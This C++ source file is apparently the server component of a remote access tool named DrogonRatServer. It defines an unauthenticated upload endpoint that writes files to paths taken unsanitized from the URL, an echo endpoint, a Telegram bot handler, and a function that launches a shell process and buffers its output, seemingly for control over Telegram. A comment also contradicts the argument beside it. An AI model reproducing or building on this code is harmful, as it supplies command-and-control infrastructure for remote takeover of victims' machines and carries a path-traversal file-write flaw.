#include "DrogonRatServer/Handler.hpp"
#include "DrogonRatServer/debug.hpp"

#include <cstdint>
#include <drogon/HttpAppFramework.h>
#include <drogon/HttpRequest.h>
#include <drogon/HttpResponse.h>
#include <drogon/orm/Mapper.h>
#include <filesystem>
#include <fmt/core.h>
#include <fstream>
#include <functional>
#include <future>
using namespace drogon;

namespace DrogonRatServer {
using HttpResponseCallback = std::function<void(const drogon::HttpResponsePtr &)>;

void Handler::registerAll() {
    this->registerEchoHandler();
    this->registerTelegramBotApiHandler();
    this->registerUploadHandler();
}

void Handler::registerUploadHandler() {
    this->drogon_app.registerHandler("/upload={filename}", // filename provided in URL
                                     [](const drogon::HttpRequestPtr &req,
                                        HttpResponseCallback &&callback,
                                        const std::string &filename) {
                                         std::ofstream out(fmt::format("upload/{}", filename),
                                                           std::ios::binary);
                                         out << req->getBody();
                                         out.close();

                                         auto resp = drogon::HttpResponse::newHttpResponse();
                                         resp->setBody(fmt::format("Saved as upload/{}", filename));
                                         callback(resp);
                                     },
                                     {drogon::Post, drogon::Put});
}

void Handler::registerEchoHandler() {
    this->drogon_app.registerHandler("/echo={message}", // message provided in URL
                                     [](const drogon::HttpRequestPtr &,
                                        HttpResponseCallback &&arg_Callback,
                                        const std::string &arg_Message) {
                                         INFO_LOG("Receiving as message:\n{}", arg_Message);
                                         auto resp = drogon::HttpResponse::newHttpResponse();
                                         resp->setBody(arg_Message);
                                         arg_Callback(resp);
                                     },
                                     {drogon::Get, drogon::Post});
}

int64_t Handler::queryUpdateOffset() {
    try {
        const auto &result =
            p_db_client->execSqlSync("SELECT MAX(id) AS max_id FROM telegram_update;");

        if(!result.empty() && !result[0]["max_id"].isNull())
            return result[0]["max_id"].as<int64_t>();
        else
            return 0;

    } catch(const drogon::orm::DrogonDbException &e) {
        ERROR_LOG("queryUpdateOffset() failed: {}", e.base().what());
        return 0;
    }
}

int64_t Handler::queryMessageOffset() {
    try {
        const auto &result =
            p_db_client->execSqlSync("SELECT MAX(id) AS max_id FROM telegram_message;");

        if(!result.empty() && !result[0]["max_id"].isNull())
            return result[0]["max_id"].as<int64_t>();
        else
            return 0;

    } catch(const drogon::orm::DrogonDbException &e) {
        ERROR_LOG("queryMessageOffset() failed: {}", e.base().what());
        return 0;
    }
}

Handler &Handler::launchShellConsole(const std::filesystem::path &Shell_Binary_Path) {
    using namespace TinyProcessLib;

    INFO_LOG("1 - Starting launchShellConsole");

    const int64_t update_offset = this->queryUpdateOffset();
    INFO_LOG("2 - Update offset: {}", update_offset);

    const int64_t message_offset = this->queryMessageOffset();
    INFO_LOG("3 - Message offset: {}", message_offset);

    INFO_LOG("4 - Chat ID: {}", this->chat_id);

    const std::string command = fmt::format("{} {} {} {}",
                                            std::filesystem::absolute(Shell_Binary_Path).string(),
                                            update_offset,
                                            message_offset,
                                            this->chat_id);
    INFO_LOG("5 - Command formatted: {}", command);

    // Verify the shell binary exists and is executable
    INFO_LOG("6 - Checking shell binary existence");
    if(!std::filesystem::exists(Shell_Binary_Path)) {
        ERROR_LOG("Shell binary does not exist: {}", Shell_Binary_Path.string());
        return *this;
    }

    INFO_LOG("7 - Shell binary exists");

    auto stdout_callback = [this](const char *bytes, size_t n) {
        INFO_LOG("Shell stdout callback - received {} bytes", n);
        std::string data(bytes, n);

        {
            std::scoped_lock lock(this->pending_updates_buffers_mutex);
            this->pending_updates_buffers.push_back(std::move(data));
        }
    };

    auto stderr_callback = [](const char *bytes, size_t n) {
        INFO_LOG("Shell stderr callback - received {} bytes", n);
        std::string error_data(bytes, n);
        ERROR_LOG("Shell stderr: {}", error_data);
    };

    INFO_LOG("8 - About to create Process object");

    // Try without the "open new console" option first
    INFO_LOG("9 - Creating Process with new_console = false");
    try {
        this->shell_process = std::make_unique<Process>(command,
                                                        "",
                                                        stdout_callback,
                                                        stderr_callback,
                                                        true); // Changed to false
        INFO_LOG("10 - Process created successfully");
    } catch(const std::exception &e) {
        ERROR_LOG("Failed to create process: {}", e.what());
        return *this;
    }

    INFO_LOG("11 - Starting monitor thread");
    std::thread([this]() {
        INFO_LOG("12 - Monitor thread started");
        int exit_code = this->shell_process->get_exit_status();
        INFO_LOG("13 - Shell process exited with code {}", exit_code);
    }).detach();

    INFO_LOG("14 - launchShellConsole completed");
    return *this;
}

} // namespace DrogonRatServer
